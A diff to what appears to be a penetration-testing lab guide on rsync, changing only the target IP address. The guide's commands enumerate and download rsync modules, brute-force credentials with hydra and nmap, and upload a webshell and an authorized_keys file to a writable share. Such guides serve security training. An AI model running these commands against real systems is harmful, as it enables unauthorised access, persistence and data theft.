@@ -149,7 +149,7 @@ The two operationally-relevant findings:
 ### Service scan
 
 ```shell
-sudo nmap -sV -p873 10.129.14.128
+sudo nmap -sV -p873 10.0.14.128
 ```
 
 ```
@@ -164,7 +164,7 @@ Version 31 = current. Older protocol versions still in deployments include 29 an
 Direct way - `rsync` against the daemon with no module specified:
 
 ```shell
-rsync rsync://10.129.14.128/
+rsync rsync://10.0.14.128/
 ```
 
 ```
@@ -176,7 +176,7 @@ Hidden modules (`list = no`) won't appear in this listing. Brute-forcing a wordl
 
 ```shell
 for module in files backup backups data www public share home upload uploads private; do
-  rsync rsync://10.129.14.128/$module/ 2>&1 | head -3
+  rsync rsync://10.0.14.128/$module/ 2>&1 | head -3
 done
 ```
 
@@ -185,11 +185,11 @@ The error message changes between "doesn't exist" and "requires authentication,"
 ### Manual interaction via netcat
 
 ```shell
-nc -nv 10.129.14.128 873
+nc -nv 10.0.14.128 873
 ```
 
 ```
-(UNKNOWN) [10.129.14.128] 873 (rsync) open
+(UNKNOWN) [10.0.14.128] 873 (rsync) open
 @RSYNCD: 31.0
 @RSYNCD: 31.0          # echo your version back
 #list                   # request the module list
@@ -203,7 +203,7 @@ The handshake uses two `@RSYNCD:` lines (one from server, one echoed back from y
 To explicitly request a module:
 
 ```
-nc -nv 10.129.14.128 873
+nc -nv 10.0.14.128 873
 @RSYNCD: 31.0
 @RSYNCD: 31.0
 files                  # name of the module you want
@@ -215,7 +215,7 @@ If `AUTHREQD` appears, auth is required. If you get straight into the file-trans
 ### Listing module contents
 
 ```shell
-rsync rsync://10.129.14.128/files
+rsync rsync://10.0.14.128/files
 ```
 
 ```
@@ -228,7 +228,7 @@ drwxr-xr-x          4,096 2021/09/19 14:21:01 docs
 For a recursive listing without downloading anything:
 
 ```shell
-rsync -av rsync://10.129.14.128/files/ --list-only
+rsync -av rsync://10.0.14.128/files/ --list-only
 ```
 
 `-a` (archive) means "recurse and preserve everything." `--list-only` is exactly what it says - list, don't transfer.
@@ -236,24 +236,24 @@ rsync -av rsync://10.129.14.128/files/ --list-only
 ### Bulk download
 
 ```shell
-rsync -avzh rsync://10.129.14.128/files/ ./files-local/
+rsync -avzh rsync://10.0.14.128/files/ ./files-local/
 ```
 
 `-a` archive, `-v` verbose, `-z` compress in flight, `-h` human-readable sizes. Result: a complete mirror of the share to `./files-local/`.
 
 ```shell
 # Just a specific file
-rsync -av rsync://10.129.14.128/files/README.txt ./
+rsync -av rsync://10.0.14.128/files/README.txt ./
 
 # Just specific patterns
-rsync -av --include='*.pdf' --exclude='*' rsync://10.129.14.128/files/ ./pdfs-only/
+rsync -av --include='*.pdf' --exclude='*' rsync://10.0.14.128/files/ ./pdfs-only/
 ```
 
 ### Testing for write access
 
 ```shell
 echo "test content" > /tmp/test-rsync.txt
-rsync -av /tmp/test-rsync.txt rsync://10.129.14.128/files/test-rsync.txt
+rsync -av /tmp/test-rsync.txt rsync://10.0.14.128/files/test-rsync.txt
 ```
 
 If `read only = yes` is set, you'll see:
@@ -267,8 +267,8 @@ If write succeeds, the file appears on the server. From there:
 
 ```shell
 # If the module path is somewhere actionable...
-rsync -av /tmp/webshell.php rsync://10.129.14.128/web/uploads/shell.php
-rsync -av /tmp/authorized_keys rsync://10.129.14.128/home/.ssh/authorized_keys
+rsync -av /tmp/webshell.php rsync://10.0.14.128/web/uploads/shell.php
+rsync -av /tmp/authorized_keys rsync://10.0.14.128/home/.ssh/authorized_keys
 ```
 
 ### Credentialed access
@@ -276,15 +276,15 @@ rsync -av /tmp/authorized_keys rsync://10.129.14.128/home/.ssh/authorized_keys
 When a module requires `auth users`:
 
 ```shell
-rsync rsync://backup_user@10.129.14.128/backup/
+rsync rsync://backup_user@10.0.14.128/backup/
 # Prompts for password
 
 # Or set RSYNC_PASSWORD env var to skip the prompt
-RSYNC_PASSWORD='secret' rsync rsync://backup_user@10.129.14.128/backup/
+RSYNC_PASSWORD='secret' rsync rsync://backup_user@10.0.14.128/backup/
 
 # Or use --password-file
 echo 'secret' > /tmp/pw && chmod 600 /tmp/pw
-rsync --password-file=/tmp/pw rsync://backup_user@10.129.14.128/backup/
+rsync --password-file=/tmp/pw rsync://backup_user@10.0.14.128/backup/
 ```
 
 ### Credential brute-force
@@ -292,13 +292,13 @@ rsync --password-file=/tmp/pw rsync://backup_user@10.129.14.128/backup/
 Hydra supports rsync:
 
 ```shell
-hydra -L users.txt -P passwords.txt rsync://10.129.14.128
+hydra -L users.txt -P passwords.txt rsync://10.0.14.128
 ```
 
 NSE script:
 
 ```shell
-nmap -p873 --script rsync-brute --script-args="rsync-brute.module=backup,userdb=users.txt,passdb=pass.txt" 10.129.14.128
+nmap -p873 --script rsync-brute --script-args="rsync-brute.module=backup,userdb=users.txt,passdb=pass.txt" 10.0.14.128
 ```
 
 Brute-force is slower against rsync than most protocols (the daemon issues a fresh challenge per attempt and the cipher is HMAC-MD5).
